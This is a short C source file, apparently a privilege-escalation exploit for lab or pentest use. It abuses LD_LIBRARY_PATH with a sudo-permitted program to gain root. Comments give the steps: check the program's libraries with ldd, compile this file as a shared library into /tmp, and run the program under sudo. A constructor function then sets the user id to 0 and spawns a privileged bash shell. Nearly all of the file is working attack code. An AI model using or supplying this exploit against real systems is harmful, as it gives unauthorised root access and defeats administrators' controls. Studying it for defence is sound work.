#include <stdio.h>
#include <stdlib.h>

// run ldd /usr/bins/theprogram : to check for library
// gcc -o /tmp/<library name> -shared -fPIC library_path.c
// sudo LD_LIBRARY_PATH=/tmp theprogram to get root

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
